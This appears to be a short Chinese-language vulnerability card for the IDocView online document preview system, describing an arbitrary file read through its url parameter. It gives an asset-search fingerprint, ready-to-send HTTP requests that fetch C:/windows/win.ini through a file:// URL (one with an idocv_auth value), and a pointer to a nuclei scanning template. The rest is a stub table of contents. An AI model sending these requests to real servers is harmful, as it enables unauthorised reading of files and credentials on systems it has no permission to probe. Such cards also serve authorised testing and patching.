# IDocView在线文档预览系统url存在任意文件读取

- **系统**：IDocView　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="I Doc View"`
- **请求**：`GET /view/url?url=file:///C:/windows/win.ini HTTP/1.1`
- **关键头**：`Host: {hostname}`

**请求体 / payload**
```
GET /view/zLnusUt.json?start=1&size=5&url=file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini&idocv_auth=sapi HTTP/1.1
Host: {hosyname}

nuclei脚本\
\[i-doc-view-url-文件读取.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- I Doc View在线文档预览系统url存在任意文件读取: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * I Doc View